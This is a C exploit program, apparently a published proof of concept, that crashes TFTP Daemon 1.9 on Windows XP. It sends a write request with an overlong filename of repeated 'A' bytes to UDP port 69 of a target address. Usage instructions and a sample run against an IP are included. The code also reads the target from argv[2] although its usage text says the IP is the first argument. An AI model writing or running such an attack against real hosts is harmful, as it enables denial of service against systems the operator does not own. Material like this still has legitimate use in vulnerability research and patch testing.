//################################################
//
//Vulnerability: Remote Buffer Overflow Exploit
//Impact: Remote Denial of Service Attack
//Vulnerable Application: TFTP Daemon Version 1.9
//Tested on Windows XP Service Pack II
//
//Author: Socket_0x03
//Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]
//Website: www.teraexe.com
//
//################################################

#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

char Buffer_Overflow[] =
"\x00\x02"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" // A = 41. 300 bytes...
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\0"
"netascii"
"\0";

void main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
SOCKET mysocket;
int destPORT = 69;

if (argc < 2){
printf("\nVulnerability: Remote Buffer Overflow Exploit\n");
printf("Impact: Remote Denial of Service Attack\n");
printf("Vulnerable Application: TFTP Daemon Version 1.9\n");
printf("\nAuthor: Socket_0x03\n");
printf("Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]\n");
printf("Website: www.teraexe.com\n");
printf("\nUsage: exploit + IP Address\n");
printf("Example: exploit 192.168.1.100\n");
return;
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) {
printf("No winsock suitable version found!");
return;
}
mysocket = socket(AF_INET, SOCK_DGRAM , 0);
if(mysocket==INVALID_SOCKET){
printf("Error: Cannot create a socket.\n");
exit(1);
}
printf("Resolving IP Address.\n");
if ((pTarget = gethostbyname(argv[2])) == NULL){
printf("Error: Resolve of %s failed.\n", argv[1]);
exit(1);
}
memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons(destPORT);

printf("Connecting to Daemon 1.9\n");
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){
printf("Error: Could not connect to TFTP Daemon\n");
exit(1);
}

printf("Connection Completed.\n");
Sleep(10);

printf("Sending packet.\n");
if (send(mysocket,Buffer_Overflow, sizeof(Buffer_Overflow)+1, 0) == -1){
printf("Error sending packet.\n");
closesocket(mysocket);
exit(1);
}
printf("Remote Buffer Overflow Completed.\n");

closesocket(mysocket);
WSACleanup();
}

/*
Microsoft Windows XP [Versión 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\>exploit

Vulnerability: Remote Buffer Overflow Exploit
Impact: Remote Denial of Service Attack
Vulnerable Application: TFTP Daemon Version 1.9

Author: Socket_0x03
Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]
Website: www.teraexe.com

Usage: exploit + IP Address
Example: exploit 192.168.1.100

C:\>exploit 192.168.1.101
Resolving IP Address.
Connecting to Daemon 1.9
Connection Completed.
Sending packet.
Remote Buffer Overflow Completed.

C:\>
*/